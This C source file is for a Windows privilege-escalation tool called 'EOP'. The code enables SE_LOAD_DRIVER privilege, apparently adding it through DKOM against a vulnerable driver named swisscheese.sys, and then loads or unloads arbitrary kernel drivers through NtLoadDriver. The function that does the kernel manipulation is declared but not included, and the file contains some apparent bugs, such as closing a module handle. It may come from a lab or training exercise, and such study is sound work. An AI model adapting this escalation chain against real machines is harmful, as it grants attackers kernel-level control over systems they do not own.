#pragma warning(disable:4201)

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <malloc.h>
#include <winternl.h>

#define DRIVER_SERVICE_KEY "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\"

// Lower 32-bits of the LUID for SE_LOAD_DRIVER_PRIVILEGE
#define SE_LOAD_DRIVER_PRIVILEGE 0xa

BOOL
DoDKOMForEOP();

VOID
LoadUnloadDriver(
	PCHAR ServiceName,
	BOOL LoadOrUnload);

BOOL
EnablePrivilege(
	ULONG Privilege);

VOID
Usage(VOID);



/// <summary>
/// ntdll!NtLoadDriver
/// </summary>
/// <param name="DriverServiceName">
/// Pointer to a counted Unicode string that specifies a path to the driver's registry key,
/// in the form of \Registry\Machine\System\CurrentControlSet\Services\<DriverName>
///	</param>
/// <returns>NTSTATUS</returns>

typedef NTSTATUS (*PNT_LOAD_DRIVER)
(
	PUNICODE_STRING DriverServiceName
);

/// <summary>
/// ntdll!NtUnloadDriver
/// </summary>
/// <param name="DriverServiceName">
/// Pointer to a counted Unicode string that specifies a path to the driver's registry key,
/// in the form of \Registry\Machine\System\CurrentControlSet\Services\<DriverName>
///	</param>
/// <returns>NTSTATUS</returns>

typedef NTSTATUS (*PNT_UNLOAD_DRIVER)
(
	PUNICODE_STRING DriverServiceName
);

/// <summary>
/// Use NtLoadDriver/NtUnloadDriver to load/unload a driver 
/// </summary>
/// <param name="ServiceName">the pointer to the driver name</param>
/// <param name="LoadOrUnload">indicate that this is Load or Unload operation</param>
/// <returns>No return value</returns>

VOID 
LoadUnloadDriver(
	PCHAR ServiceName,
	BOOL LoadOrUnload)
{
	UNICODE_STRING ServicePath = { 0 };

	//get ntdll module handle by GetModuleHandle in order to get exported nt functions
	HMODULE hNtdll = NULL;
	if ((hNtdll = GetModuleHandle("ntdll.dll")) == NULL)
	{
		printf("[-] GetModuleHandle(ntdll.dll) failed: %08x\n", GetLastError());
		goto Exit;
	}

	//get the exported function pointer of NtLoadDriver and NtUnloadDriver from ntdll
	PNT_LOAD_DRIVER pNtLoadDriver = NULL;
	if ((pNtLoadDriver = (PNT_LOAD_DRIVER)(GetProcAddress(hNtdll, "NtLoadDriver"))) == NULL)
	{
		printf("[-] GetProcAddress(NtLoadDriver) failed: %08x\n", GetLastError());
		goto Exit;
	}

	PNT_UNLOAD_DRIVER pNtUnloadDriver = NULL;
	if ((pNtUnloadDriver = (PNT_UNLOAD_DRIVER)(GetProcAddress(hNtdll, "NtUnloadDriver"))) == NULL)
	{
		printf("[-] GetProcAddress(NtUnloadDriver) failed: %08x\n", GetLastError());
		goto Exit;
	}

	//start the service path unicode_string
	ServicePath.MaximumLength = (USHORT)(strlen(DRIVER_SERVICE_KEY) + strlen(ServiceName) + 1) * sizeof(WCHAR);
	if ((ServicePath.Buffer = (PWCHAR)malloc(ServicePath.MaximumLength)) == NULL)
	{
		printf("[-] malloc(%d) failed\n", ServicePath.MaximumLength);
		goto Exit;
	}

	swprintf(ServicePath.Buffer, ServicePath.MaximumLength, L"%hs%hs", DRIVER_SERVICE_KEY, ServiceName);
	ServicePath.Length = ServicePath.MaximumLength - sizeof(WCHAR); //null-terminate

	printf("[+] %s %wZ\n", LoadOrUnload ? "Loading" : "Unloading", &ServicePath);

	//load or unload the driver
	NTSTATUS Status;

	if (LoadOrUnload)
	{
		Status = pNtLoadDriver(&ServicePath);

		if (!NT_SUCCESS(Status))
		{
			printf("[-] NtLoadDriver(%s) failed: %08x\n", ServiceName, GetLastError());
		}
	}
	else
	{
		Status = pNtUnloadDriver(&ServicePath);

		if (!NT_SUCCESS(Status))
		{
			printf("[-] NtUnloadDriver(%s) failed: %08x\n", ServiceName, GetLastError());
		}
	}


Exit:
	if (hNtdll)
	{
		CloseHandle(hNtdll);
	}

	if (pNtLoadDriver)
	{
		pNtLoadDriver = NULL;
	}

	if (pNtUnloadDriver)
	{
		pNtUnloadDriver = NULL;
	}

	if (ServicePath.Buffer)
	{
		free(ServicePath.Buffer);
	}

	return;
};//LoadUnloadDriver()

/// <summary>
/// Enable existing privilege 
/// </summary>
/// <param name="Privilege">privilege name</param>
/// <returns>TRUE if ERROR_SUCCESS</returns>

BOOL 
EnablePrivilege(
	ULONG Privilege
)
{
	BOOL bStatus = TRUE;

	//get current process token
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		printf("[-] OpenProcessToken() failed: %08x\n", GetLastError());
		bStatus = FALSE;
		goto Exit;
	}

	//setup token prvileges
	TOKEN_PRIVILEGES TokenPrivilege;

	TokenPrivilege.PrivilegeCount = 1;
	TokenPrivilege.Privileges[0].Luid.LowPart = Privilege;
	TokenPrivilege.Privileges[0].Luid.HighPart = 0;
	TokenPrivilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(
			hToken,
			FALSE,
			&TokenPrivilege,
			sizeof(TOKEN_PRIVILEGES),
			NULL,
			NULL))
	{
		printf("AdjustTokenPrivileges failed: %08x\n", GetLastError());
		bStatus = FALSE;
		goto Exit;
	}


Exit:
	if (hToken)
	{
		CloseHandle(hToken);
	}

	return bStatus;

}//EnablePrivilege()

/// <summary>
/// display how to use the command 
/// </summary>
/// <returns>No return value</returns>

VOID 
Usage(VOID)
{
	printf("\nusage : EOP [-e] [-a] [-u] <DriverServiceName>\n");
	printf("\t-a : Add/enable SE_LOAD_DRIVER Privilege (requires swisscheese.sys)\n");
	printf("\t-e : enable SE_LOAD_DRIVER Privilege (requires swisscheese.sys and eop.exe run as admin)\n");
	printf("\t-u : Unload Driver\n");
}//Usage()

/// <summary>
/// main entry point
/// </summary>
/// <returns>return 0</returns>

int _cdecl
main(
	int argc,
	char *argv[])
{
	if (argc < 2) 
	{
		Usage();
		goto Exit;
	}

	//TRUE: Load, FALSE: Unload
	BOOL bLoadOrUnload = TRUE; 

	BOOL bEscalateOfPrivilege = FALSE;
	BOOL bEnableSeLoadDriverPrivilege = FALSE;
	PCHAR pbDriverServiceName = NULL;

	//handling the first argument
	if (strcmp(argv[1], "/?") == 0) 
	{
		Usage();
		goto Exit;
	}
	else if (strcmp(argv[1], "-?") == 0)
	{
		Usage();
		goto Exit;
	}
	else if (strcmp(argv[1], "-u") == 0)
	{
		bLoadOrUnload = FALSE;
	}
	else if (strcmp(argv[1], "-a") == 0)
	{
		bEscalateOfPrivilege = TRUE;
	}
	else if (strcmp(argv[1], "-e") == 0)
	{
		bEnableSeLoadDriverPrivilege = TRUE;
	}
	else 
	{
		Usage();
		goto Exit;
	}

	//assign the driver service name
	pbDriverServiceName = argv[2];

	if (pbDriverServiceName == NULL) 
	{
		Usage();
		goto Exit;
	}

	printf("[+] ProcessId=%x\n", GetCurrentProcessId());


	BOOL bResult = FALSE;

	if (bEscalateOfPrivilege) 
	{
		// add SE_LOAD_DRIVER privilege using DKO
		printf("[m] Attempting escalate privilege using DKOM\n");

		bResult = DoDKOMForEOP();
		if (!bResult) {
			printf("[-] DoDKOMforEOP() failed\n");
			goto Exit;
		}

		printf("[+] successfully escalate privilege using DKOM\n");
	}

	if (bEnableSeLoadDriverPrivilege)
	{
		if (!EnablePrivilege(SE_LOAD_DRIVER_PRIVILEGE))
		{
			printf("[-] EnablePrivilege(SE_LOAD_DRIVER_PRIVILEGE) failed\n");
			goto Exit;
		}
	}

	LoadUnloadDriver(pbDriverServiceName, bLoadOrUnload);

Exit:
	pbDriverServiceName = NULL;
	return 0;
}//main()



